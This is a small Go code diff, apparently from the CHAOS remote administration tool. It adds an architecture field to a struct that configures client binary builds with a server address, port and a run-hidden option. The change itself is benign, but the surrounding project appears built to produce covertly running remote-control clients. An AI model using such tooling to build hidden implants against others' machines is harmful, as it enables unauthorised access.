@@ -2,6 +2,7 @@ package client
 
 import (
 	"context"
+
 	"github.com/gorilla/websocket"
 	"github.com/tiagorlampert/CHAOS/internal/utils"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
@@ -22,6 +23,7 @@ type BuildClientBinaryInput struct {
 	ServerAddress, ServerPort, Filename string
 	RunHidden                           bool
 	OSTarget                            system.OSType
+	OSArch                              string
 }
 
 func (b BuildClientBinaryInput) GetServerAddress() string {
